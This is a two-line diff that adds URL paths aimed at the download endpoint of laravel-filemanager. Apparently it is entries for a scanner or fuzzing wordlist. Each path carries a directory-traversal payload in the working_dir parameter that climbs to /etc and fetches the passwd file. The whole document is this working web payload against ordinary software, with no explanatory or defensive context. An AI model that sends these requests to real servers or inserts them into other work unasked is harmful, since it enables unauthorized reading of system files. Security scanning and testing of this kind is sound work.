@@ -1,0 +1,2 @@
+/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd
+/laravel-filemanager/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd
